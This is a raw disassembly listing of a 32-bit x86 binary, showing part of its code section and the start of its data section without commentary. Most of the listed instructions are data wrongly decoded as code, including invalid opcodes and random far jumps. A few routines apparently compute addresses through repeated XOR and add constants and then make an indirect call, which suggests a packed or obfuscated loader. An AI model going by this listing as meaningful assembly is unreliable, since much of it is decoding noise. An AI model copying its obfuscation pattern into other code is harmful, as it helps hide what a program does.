  412441:	shl    BYTE PTR [esi+0x66963d7],0xf6
  412448:	pop    es
  412449:	outs   dx,BYTE PTR ds:[esi]
  41244a:	arpl   WORD PTR [ecx+ebx*8+0x6],cx
  41244e:	sub    al,0x86
  412450:	xor    dh,bl
  412452:	hlt    
  412453:	mov    ch,0x2
  412455:	sub    eax,0xe06ecdd1
  41245a:	and    ch,BYTE PTR [ebp-0x32e46abe]
  412460:	dec    edx
  412461:	dec    esi
  412462:	out    0xfb,al
  412464:	call   0x805ab3d1
  412469:	stos   BYTE PTR es:[edi],al
  41246a:	test   DWORD PTR [eax],0xd9f2d841
  412470:	loop   0x4124d5
  412472:	xor    eax,0x8a4a5e37
  412477:	and    esp,0x39
  41247a:	dec    edx
  41247b:	mov    ds:0x10893ea7,eax
  412480:	pop    edx
  412481:	or     dl,BYTE PTR [edx-0x43]
  412484:	cdq    
  412485:	add    eax,0xc166856b
  41248a:	jecxz  0x4124ad
  41248c:	ins    BYTE PTR es:[edi],dx
  41248d:	pop    ebx
  41248e:	pusha  
  41248f:	daa    
  412490:	mov    dl,0x37
  412492:	sub    DWORD PTR [eax],edi
  412494:	or     edi,DWORD PTR [edi-0x4fc1471c]
  41249a:	aas    
  41249b:	(bad)  
  41249c:	push   ebx
  41249d:	mov    ds:0xc40241dc,al
  4124a2:	dec    eax
  4124a3:	pop    edi
  4124a4:	clc    
  4124a5:	ret    
  4124a6:	nop
  4124a7:	ins    BYTE PTR es:[edi],dx
  4124a8:	fnstcw WORD PTR gs:[edi-0x8b4b94]
  4124af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124b0:	(bad)  
  4124b1:	jmp    0x62dbe024
  4124b6:	sbb    ch,BYTE PTR [ebp+0x4d]
  4124b9:	mov    cl,ah
  4124bb:	enter  0x43d3,0xe6
  4124bf:	mov    cl,0x7e
  4124c1:	retf   0x6837
  4124c4:	jae    0x4124c0
  4124c6:	jmp    0x5eb0822e
  4124cb:	mov    BYTE PTR [edx-0x45],bl
  4124ce:	fst    st(7)
  4124d0:	sub    BYTE PTR [eax+0x5d7da996],bl
  4124d6:	(bad)  
  4124d7:	jl     0x4124fd
  4124d9:	inc    esp
  4124da:	lods   al,BYTE PTR ds:[esi]
  4124db:	sub    al,0x3
  4124dd:	inc    ebp
  4124de:	or     BYTE PTR [ecx+0x458bf045],cl
  4124e4:	in     al,0x85
  4124e6:	ror    BYTE PTR [edi],0x84
  4124e9:	retf   0x4
  4124ec:	add    BYTE PTR [ecx+0xb6adc75],cl
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	inc    ebp
  41259f:	call   0x7e7e:0x5d594486
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x4125a8
  4125ab:	pop    es
  4125ac:	dec    edi
  4125ad:	xchg   esp,eax
  4125ae:	pop    esp
  4125af:	daa    
  4125b0:	retf   0xa9a2
  4125b3:	inc    ebp
  4125b4:	ins    BYTE PTR es:[edi],dx
  4125b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125b6:	push   ebx
  4125b7:	sbb    DWORD PTR [ebp+0x1bd65d33],eax
  4125bd:	push   ss
  4125be:	sbb    al,0xfa
  4125c0:	jnp    0x4125fd
  4125c2:	clc    
  4125c3:	push   ebx
  4125c4:	dec    ebx
  4125c5:	cmc    
  4125c6:	xchg   edx,eax
  4125c7:	jecxz  0x41255d
  4125c9:	or     ch,BYTE PTR [edi+0x52]
  4125cc:	dec    edx
  4125cd:	mov    DWORD PTR [ecx+0x23],ebp
  4125d0:	jge    0x4125a0
  4125d2:	cwde   
  4125d3:	add    esi,ebx
  4125d5:	ret    
  4125d6:	leave  
  4125d7:	repz jo 0x4125ff
  4125da:	pop    edi
  4125db:	xchg   edi,eax
  4125dc:	or     dh,0x62
  4125df:	fldenv [ebx]
  4125e1:	pop    edx
  4125e2:	in     al,0xb
  4125e4:	mov    eax,0x27f9f56c
  4125e9:	mov    edx,0x981f5d1a
  4125ee:	dec    edx
  4125ef:	or     al,0xc5
  4125f1:	mov    ds:0xc2ef4d7e,al
  4125f6:	es mov ah,0x8b
  4125f9:	mov    eax,ds:0xf2def208
  4125fe:	clc    
  4125ff:	iret   
  412600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412601:	(bad)  
  412602:	cmp    eax,0x9ace4a14
  412607:	jns    0x4125cc
  412609:	jnp    0x41261e
  41260b:	outs   dx,DWORD PTR ds:[esi]
  41260c:	fsubr  DWORD PTR [si+0x7eca]
  412611:	fnstenv [eax+0x2f29073f]
  412617:	ins    BYTE PTR es:[edi],dx
  412618:	jl     0x412675
  41261a:	dec    ecx
  41261b:	les    eax,FWORD PTR [esi-0x7d7ef16e]
  412621:	cdq    
  412622:	fmul   QWORD PTR [ebx+0x24]
  412625:	out    0x7c,eax
  412627:	mov    ebp,0x46fe5f51
  41262c:	push   eax
  41262d:	sub    DWORD PTR [edx],ecx
  41262f:	jl     0x4125d6
  412631:	inc    esi
  412632:	jnp    0x4125d0
  412634:	fisubr DWORD PTR [esi-0x683dcdd5]
  41263a:	adc    BYTE PTR [edi-0x1de65d70],dl
  412640:	cli    
  412641:	(bad)  
  412643:	push   ebp
  412644:	cmp    BYTE PTR [edi+0x2584d87a],bh
  41264a:	(bad)  
  41264b:	aad    0x1
  41264d:	rol    BYTE PTR [eax],cl
  41264f:	jg     0x412643
  412651:	ss dec esi
  412653:	hlt    
  412654:	mov    eax,ds:0x3e1e48eb
  412659:	shl    bh,0x15
  41265c:	push   es
  41265d:	sub    esp,eax
  41265f:	shr    BYTE PTR [eax-0x69b4aa1d],cl
  412665:	repz sahf 
  412667:	xchg   esp,eax
  412668:	jnp    0x4125fd
  41266a:	and    al,0x9c
  41266c:	fnstcw WORD PTR [ebx]
  41266e:	push   es
  41266f:	jecxz  0x4125f8
  412671:	aam    0xd6
  412673:	push   esi
  412674:	fxtract 
  412676:	es popa 
  412678:	cmp    al,0xfc
  41267a:	xor    cl,cl
  41267c:	sahf   
  41267d:	retf   
  41267e:	sub    al,0xcb
  412680:	retf   
  412681:	jg     0x412682
  412683:	mov    eax,DWORD PTR [edi]
  412685:	cmp    BYTE PTR [ecx],bl
  412687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412688:	mov    dl,0xd6
  41268a:	jecxz  0x41266c
  41268c:	cmp    BYTE PTR [esi-0x15],ch
  41268f:	cs mov bh,0xb6
  412692:	in     eax,dx
  412693:	dec    esp
  412694:	fwait
  412695:	repz inc edx
  412697:	jbe    0x4126f9
  412699:	icebp  
  41269a:	or     BYTE PTR [esi-0x232dbb18],bh
  4126a0:	mov    ds:0x5af09be9,eax
  4126a5:	xlat   BYTE PTR ds:[ebx]
  4126a6:	out    0xc3,al
  4126a8:	call   0x38b9:0xe496420f
  4126af:	mov    al,ds:0x91fb486
  4126b4:	inc    cl
  4126b6:	pop    ebp
  4126b7:	ja     0x412732
  4126b9:	pop    ebx
  4126ba:	lds    edi,FWORD PTR [edi]
  4126bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126bd:	push   ebp
  4126be:	icebp  
  4126bf:	push   edx
  4126c0:	mov    edx,0x52f94a16
  4126c5:	sub    al,0x8c
  4126c7:	jge    0x412683
  4126c9:	inc    esp
  4126ca:	test   DWORD PTR [ecx+ebx*8+0x3626e4c1],ebx
  4126d1:	dec    edx
  4126d2:	jge    0x41269c
  4126d4:	cs pop esp
  4126d6:	add    eax,0x641d5ccb
  4126db:	mov    ebx,0xbc38d410
  4126e0:	jl     0x4126aa
  4126e2:	pushf  
  4126e3:	xchg   edx,eax
  4126e4:	call   0xaaa4:0xcc476e4a
  4126eb:	stos   DWORD PTR es:[edi],eax
  4126ec:	jb     0x412730
  4126ee:	push   0x34
  4126f0:	and    esi,ebp
  4126f2:	sahf   
  4126f3:	sbb    bh,BYTE PTR [ebx]
  4126f5:	mov    ah,0x1b
  4126f7:	les    esp,FWORD PTR [edx*2-0x52d0cf28]
  4126fe:	imul   esi,DWORD PTR [esi+0x4e9e3e29],0x6b
  412705:	jae    0x4126db
  412707:	sub    ecx,DWORD PTR [edx+0xa]
  41270a:	mov    edx,0x1ae69e2f
  41270f:	inc    ebx
  412710:	push   0x3dfde0b
  412715:	aaa    
  412716:	mov    dl,0x35
  412718:	rcl    DWORD PTR [ebx+0x60785bb5],0xb8
  41271f:	fsubr  DWORD PTR [edx]
  412721:	xchg   esp,eax
  412722:	sbb    cl,BYTE PTR [edx]
  412724:	rol    DWORD PTR [edx-0x55],0x3b
  412728:	stos   DWORD PTR es:[edi],eax
  412729:	dec    edx
  41272a:	sub    dl,BYTE PTR [edx]
  41272c:	cmp    DWORD PTR [ebx-0x2ac9a9db],0xffffffd3
  412733:	jge    0x4127b1
  412735:	dec    eax
  412736:	sbb    DWORD PTR [ecx-0x66fae2b2],ebp
  41273c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41273d:	and    DWORD PTR [eax],esi
  41273f:	inc    eax
  412740:	xor    DWORD PTR [esi],eax
  412742:	div    ch
  412744:	fstp   QWORD PTR [esi-0x13]
  412747:	xchg   DWORD PTR [eax-0x379ddb8],ecx
  41274d:	push   0x6
  41274f:	fs (bad) 
  412752:	dec    edi
  412753:	fimul  DWORD PTR [eax]
  412755:	ror    dl,cl
  412757:	jnp    0x412732
  412759:	jle    0x412773
  41275b:	nop
  41275c:	dec    ebp
  41275d:	mov    ah,BYTE PTR [esi]
  41275f:	pusha  
  412760:	call   0x5206cdd
  412765:	inc    ebp
  412766:	mov    edi,0x59ce44b8
  41276b:	mov    DWORD PTR [di+0x434f],esp
  412770:	fucom  st(5)
  412772:	mov    ebx,0xc37d7666
  412777:	(bad)  
  412778:	lods   eax,DWORD PTR ds:[esi]
  412779:	push   ss
  41277a:	ds in  al,0x39
  41277d:	(bad)  
  41277e:	jg     0x412732
  412780:	xor    cl,BYTE PTR [ecx+0x8]
  412783:	(bad)  
  412784:	aad    0x61
  412786:	mov    dh,0xac
  412788:	pop    ds
  412789:	ss jo  0x4127be
  41278c:	mov    esp,0xfbe9c133
  412791:	add    DWORD PTR [eax],eax
  412793:	add    BYTE PTR [edi],dh
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	fiadd  WORD PTR [edx+0x1]
  4127a3:	pop    edx
  4127a4:	inc    esp
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x412751
  4127ad:	or     ax,0x7a4a
  4127b1:	dec    ecx
  4127b2:	push   ebx
  4127b3:	adc    BYTE PTR [ecx+0xa],bl
  4127b6:	int    0x6
  4127b8:	lea    ebx,[ebx]
  4127ba:	aad    0xcf
  4127bc:	ss stc 
  4127be:	pop    es
  4127bf:	ins    DWORD PTR es:[edi],dx
  4127c0:	stc    
  4127c1:	mov    edx,DWORD PTR [ebp+esi*1+0x795cc835]
  4127c8:	xchg   edx,eax
  4127c9:	inc    edx
  4127ca:	sbb    esi,DWORD PTR [esi-0x30]
  4127cd:	mov    ebx,0x233ff5f6
  4127d2:	out    dx,eax
  4127d3:	out    0x9f,eax
  4127d5:	mov    ds:0xe7c3d090,eax
  4127da:	push   0xedaf15a2
  4127df:	rcr    edx,cl
  4127e1:	sub    ch,0xe0
  4127e4:	xchg   ecx,eax
  4127e5:	jb     0x412807
  4127e7:	mov    ecx,0xcec4d9d
  4127ec:	add    esp,DWORD PTR [eax+0x21471948]
  4127f2:	mov    ch,0x5b
  4127f4:	sti    
  4127f5:	mov    eax,ds:0x338e8e3
  4127fa:	fwait
  4127fb:	imul   esp,esp,0x9dc4e41c
  412801:	out    0x19,al
  412803:	ret    0x8f52
  412806:	jle    0x412837
  412808:	mov    eax,0xbebd1194
  41280d:	repnz inc esp
  41280f:	mov    cl,0x9d
  412811:	xor    DWORD PTR [ebx+0x74370c8c],edi
  412817:	sbb    DWORD PTR [edx-0x3fb8b7fb],0xf5edd97a
  412821:	int    0xe5
  412823:	xchg   esp,eax
  412824:	pop    ebx
  412825:	jmp    0x77d:0xb7c733c9
  41282c:	push   0xffffffab
  41282e:	push   edx
  41282f:	ds inc esp
  412831:	or     al,0xe3
  412833:	push   ecx
  412834:	repz adc ah,BYTE PTR [edx-0x2d]
  412838:	fcmovnbe st,st(3)
  41283a:	mov    bl,0x3f
  41283c:	rol    dh,1
  41283e:	call   0x1db5:0x841e14a2
  412845:	stos   DWORD PTR es:[edi],eax
  412846:	lahf   
  412847:	and    eax,0xfb01fe75
  41284c:	and    DWORD PTR [ebp-0xe0c375b],0x66bf4280
  412856:	jmp    0xf484:0x4ba36bd6
  41285d:	test   DWORD PTR [eax+0x1121b6da],ebx
  412863:	jnp    0x4128d1
  412865:	pop    edi
  412866:	mov    BYTE PTR [ecx-0x13],bl
  412869:	les    eax,FWORD PTR [ecx+0xa4e385c]
  41286f:	sbb    BYTE PTR [ecx],0x3a
  412872:	mov    esp,0x980b6886
  412877:	and    edi,ebp
  412879:	mov    ds:0x8ada9858,al
  41287e:	push   ds
  41287f:	adc    ch,BYTE PTR [edx]
  412881:	lods   eax,DWORD PTR ds:[esi]
  412882:	jo     0x412879
  412884:	push   ebx
  412885:	pop    es
  412886:	aam    0x11
  412888:	inc    edx
  412889:	(bad)  
  41288b:	mov    bl,0xf
  41288d:	shl    DWORD PTR [esi-0x49],cl
  412890:	inc    eax
  412891:	mov    ds:0xaccd19c3,eax
  412896:	les    edi,FWORD PTR [edi]
  412898:	push   esi
  412899:	jo     0x412836
  41289b:	mov    bh,0xd0
  41289d:	push   esi
  41289e:	push   0x63d4fe7c
  4128a3:	sub    eax,0x5032651b
  4128a8:	fs mov al,0x1c
  4128ab:	push   ss
  4128ac:	mov    ecx,DWORD PTR [eax+0x7b]
  4128af:	adc    eax,0x44062f1
  4128b4:	dec    esi
  4128b5:	mov    edx,0x105854c6
  4128ba:	xor    eax,0x1dbcb453
  4128bf:	jmp    0x4128c5
  4128c1:	sub    BYTE PTR [ecx],ah
  4128c3:	inc    ebx
  4128c4:	(bad)  
  4128c5:	daa    
  4128c6:	loopne 0x412919
  4128c8:	stos   BYTE PTR es:[edi],al
  4128c9:	in     eax,0x38
  4128cb:	mov    DWORD PTR ds:0xd85421c0,ecx
  4128d1:	jle    0x4128fe
  4128d3:	add    ecx,DWORD PTR [eax-0x4608279c]
  4128d9:	jge    0x4128be
  4128db:	jecxz  0x41286a
  4128dd:	out    0xce,al
  4128df:	or     edx,DWORD PTR [ebx+0x19323da0]
  4128e5:	in     al,0x65
  4128e7:	pop    ecx
  4128e8:	repnz in eax,dx
  4128ea:	in     eax,0x5a
  4128ec:	ins    BYTE PTR es:[edi],dx
  4128ed:	es pop esi
  4128ef:	sbb    eax,0xb4c60b12
  4128f4:	retf   0xf11c
  4128f7:	stos   BYTE PTR es:[di],al
  4128f9:	cld    
  4128fa:	xchg   edi,eax
  4128fb:	mov    ds:0xcefab428,al
  412900:	jno    0x412948
  412902:	cmp    eax,0xfddacce0
  412907:	mov    bl,0x2a
  412909:	adc    al,0xc2
  41290b:	mov    bh,0x96
  41290d:	push   edx
  41290e:	push   0xd17161b5
  412913:	fnstenv [edx-0x63]
  412916:	mov    al,ds:0xf0d1d5fd
  41291b:	clc    
  41291c:	push   edx
  41291d:	inc    eax
  41291e:	pop    es
  41291f:	jns    0x412945
  412921:	das    
  412922:	arpl   WORD PTR [ebx-0x457ae53],ax
  412928:	pop    edi
  412929:	(bad)  
  41292a:	ror    ebx,cl
  41292c:	dec    edx
  41292d:	loop   0x41296f
  41292f:	enter  0x3855,0x72
  412933:	retf   0xd01
  412936:	dec    esi
  412937:	out    dx,al
  412938:	(bad)  
  412939:	mov    al,ds:0xa330a69
  41293e:	pop    eax
  41293f:	std    
  412940:	rcl    dl,cl
  412942:	pop    ds
  412943:	sbb    bh,BYTE PTR [edx+0x56]
  412946:	sub    al,0x4a
  412948:	arpl   WORD PTR [edi],ax
  41294a:	mov    ecx,0xce46942a
  41294f:	dec    ebx
  412950:	jecxz  0x41295a
  412952:	mov    al,0x1b
  412954:	push   ebp
  412955:	xor    eax,0xfa2cde49
  41295a:	pop    es
  41295b:	push   ebx
  41295c:	mov    edi,0x5ebcaeb
  412961:	inc    edi
  412962:	jne    0x4129c3
  412964:	div    BYTE PTR [ebx-0x51b2152c]
  41296a:	xor    dl,BYTE PTR [eax-0x45523a20]
  412970:	mov    ebp,0x3199fb82
  412975:	in     al,0x23
  412977:	(bad)  
  412978:	jmp    0x83c2:0x85a2effe
  41297f:	fstp   QWORD PTR [esi+0x6e4fcc65]
  412985:	xor    al,0x78
  412987:	pop    esp
  412988:	dec    edi
  412989:	sbb    al,0x7
  41298b:	xor    al,0x50
  41298d:	std    
  41298e:	das    
  41298f:	add    eax,esi
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fsub   DWORD PTR [esi+0x73]
  4129f0:	inc    eax
  4129f1:	(bad)  
  4129f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x4129c3
  4129fb:	cmp    ebp,DWORD PTR [edi+0x61]
  4129fe:	leave  
  4129ff:	aaa    
  412a00:	add    DWORD PTR [ebp+0x18],edi
  412a03:	adc    eax,0xac61d2d6
  412a08:	mov    ds:0xbf9388ba,al
  412a0d:	aam    0xed
  412a0f:	test   DWORD PTR [esi+0xd2fb30d],edx
  412a15:	pop    esp
  412a16:	aaa    
  412a17:	(bad)  
  412a18:	cmp    al,BYTE PTR [esi]
  412a1a:	js     0x412a6b
  412a1c:	int    0xe
  412a1e:	or     BYTE PTR [ebp+0x24f924ad],ch
  412a24:	das    
  412a25:	lods   eax,DWORD PTR ds:[esi]
  412a26:	sub    cl,BYTE PTR [esi-0xc7f1ba5]
  412a2c:	sub    al,0xc9
  412a2e:	jge    0x412a75
  412a30:	mul    dl
  412a32:	jmp    0x4129fc
  412a34:	mov    WORD PTR [eax-0x5c],ss
  412a37:	xor    ecx,edx
  412a39:	jns    0x4129f6
  412a3b:	call   0xc7e4:0x7450bb35
  412a42:	ins    DWORD PTR es:[edi],dx
  412a43:	cdq    
  412a44:	das    
  412a45:	xchg   esi,eax
  412a46:	imul   eax,DWORD PTR [edx+0x42],0xf1962a35
  412a4d:	aas    
  412a4e:	pop    es
  412a4f:	(bad)  
  412a50:	fidiv  WORD PTR [edx+0x30]
  412a53:	adc    DWORD PTR [eax-0x3bc13f6f],ebx
  412a59:	sub    al,0x87
  412a5b:	and    BYTE PTR [edi+ecx*2],bl
  412a5e:	mov    al,ds:0x56326eb1
  412a63:	jg     0x412a77
  412a65:	iret   
  412a66:	mov    edx,0x71f1b086
  412a6b:	fwait
  412a6c:	pop    edx
  412a6d:	xor    DWORD PTR [ecx-0x680fcd48],ebx
  412a73:	mov    eax,0xa6987b80
  412a78:	inc    esi
  412a79:	inc    ecx
  412a7a:	mov    ds:0x89ad4ad3,al
  412a7f:	lock or dh,BYTE PTR cs:[edx+0x5f69905a]
  412a87:	pushf  
  412a88:	aas    
  412a89:	inc    ebp
  412a8a:	enter  0xe622,0xaf
  412a8e:	arpl   WORD PTR [edi],di
  412a90:	call   0xbee1:0xa8bde67c
  412a97:	in     al,0xc3
  412a99:	(bad)  
  412a9b:	jmp    FWORD PTR [edi+0x71]
  412a9e:	gs xor esp,ecx
  412aa1:	jp     0x412ae0
  412aa3:	add    al,0xeb
  412aa5:	jb     0x412ad4
  412aa7:	jmp    DWORD PTR [edx]
  412aa9:	loopne 0x412a95
  412aab:	mov    edi,0x25cfeeb3
  412ab0:	xchg   BYTE PTR [esi+0x37427913],dh
  412ab6:	sub    BYTE PTR [edx],dl
  412ab8:	jle    0x412a5c
  412aba:	prefetcht0 BYTE PTR [esi-0x76ddf21b]
  412ac1:	aad    0x94
  412ac3:	das    
  412ac4:	imul   ecx,DWORD PTR [eax+0x34],0xffffffe4
  412ac8:	aaa    
  412ac9:	sub    eax,0x9140f971
  412ace:	xor    BYTE PTR [ebx-0x2a7f81d7],bh
  412ad4:	je     0x412aec
  412ad6:	jae    0x412b23
  412ad8:	dec    edi
  412ad9:	mov    esi,0x4fc8d32e
  412ade:	cli    
  412adf:	jp     0x412a78
  412ae1:	xor    eax,0xd2516c0c
  412ae6:	out    dx,eax
  412ae7:	xor    al,0x3e
  412ae9:	bound  edx,QWORD PTR [edx+ebp*1]
  412aec:	pop    esp
  412aed:	fnstenv cs:[edx+0x3c]
  412af1:	imul   eax,DWORD PTR [ebx+0x1d709538],0x3c74411a
  412afb:	mov    ecx,0xc9186c7d
  412b00:	jo     0x412ae1
  412b02:	jecxz  0x412b74
  412b04:	loope  0x412b6a
  412b06:	fsub   DWORD PTR [ebx]
  412b08:	xchg   ebx,eax
  412b09:	mov    dh,0x28
  412b0b:	pop    ss
  412b0c:	shl    BYTE PTR [edi],cl
  412b0e:	ret    0x2deb
  412b11:	jp     0x412acc
  412b13:	dec    edx
  412b14:	mov    ds,esi
  412b16:	(bad)  
  412b17:	fs mov dl,0x15
  412b1a:	enter  0x7ef0,0xf7
  412b1e:	sti    
  412b1f:	sbb    eax,0xb428f8b7
  412b24:	pop    ebx
  412b25:	js     0x412b9e
  412b27:	adc    ah,bh
  412b29:	pop    edi
  412b2a:	out    dx,al
  412b2b:	mov    dl,0xcb
  412b2d:	inc    esi
  412b2e:	jge    0x412ab0
  412b30:	xor    eax,0x688fa52a
  412b35:	mov    eax,0x8498bbe1
  412b3a:	xor    edi,esi
  412b3c:	push   ebp
  412b3d:	test   al,0x38
  412b3f:	nop
  412b40:	rcl    esp,0x24
  412b43:	daa    
  412b44:	xor    ch,dh
  412b46:	lds    ebp,FWORD PTR [eax-0x2266d660]
  412b4c:	icebp  
  412b4d:	and    ebx,esp
  412b4f:	or     esi,esp
  412b51:	stos   BYTE PTR es:[edi],al
  412b52:	cmp    BYTE PTR [eax+0x23c096cb],cl
  412b58:	daa    
  412b59:	add    al,0xf4
  412b5b:	mov    bl,0x80
  412b5d:	mov    DWORD PTR [edi-0x2d02b708],edx
  412b63:	push   ebx
  412b64:	mov    dh,0x7a
  412b66:	jmp    0x412b66
  412b68:	jno    0x412b8c
  412b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6b:	rcl    esp,1
  412b6d:	test   DWORD PTR [edx],ebx
  412b6f:	mov    bh,0x51
  412b71:	xchg   DWORD PTR [ebx+0x78],ebp
  412b74:	test   BYTE PTR [edi],dh
  412b76:	das    
  412b77:	sbb    ecx,eax
  412b79:	mov    DWORD PTR [eax],ebx
  412b7b:	out    0x8b,al
  412b7d:	hlt    
  412b7e:	shl    DWORD PTR [eax+0x5eb4bd84],0x72
  412b85:	pushf  
  412b86:	stos   DWORD PTR es:[edi],eax
  412b87:	xchg   ecx,eax
  412b88:	push   esp
  412b89:	cmp    al,0x64
  412b8b:	bound  ecx,QWORD PTR [edx+0x6564b8da]
  412b91:	push   edi
  412b92:	sete   BYTE PTR [ebp+0x2acbc9ea]
  412b99:	ret    0x919c
  412b9c:	mul    DWORD PTR [esi*1-0x1880fda9]
  412ba3:	in     eax,0xc6
  412ba5:	cmp    DWORD PTR [edi+ebp*4+0x2c],ebx
  412ba9:	imul   ebp,DWORD PTR [ebx+edi*1-0x35],0x57
  412bae:	xchg   DWORD PTR [ebp+0x1987e2c7],esp
  412bb4:	int    0x9e
  412bb6:	icebp  
  412bb7:	inc    edi
  412bb8:	fcomp  QWORD PTR [edx]
  412bba:	neg    DWORD PTR [esp+edx*4+0x66bc829e]
  412bc1:	test   BYTE PTR [eax+0x2ef53c1d],bl
  412bc7:	stos   BYTE PTR es:[edi],al
  412bc8:	popa   
  412bc9:	sub    BYTE PTR [edx+0x139242a4],dh
  412bcf:	xor    BYTE PTR [esi+0x3403cad8],cl
  412bd5:	push   0x5e
  412bd7:	push   ds
  412bd8:	mov    edi,0x7d1c6473
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
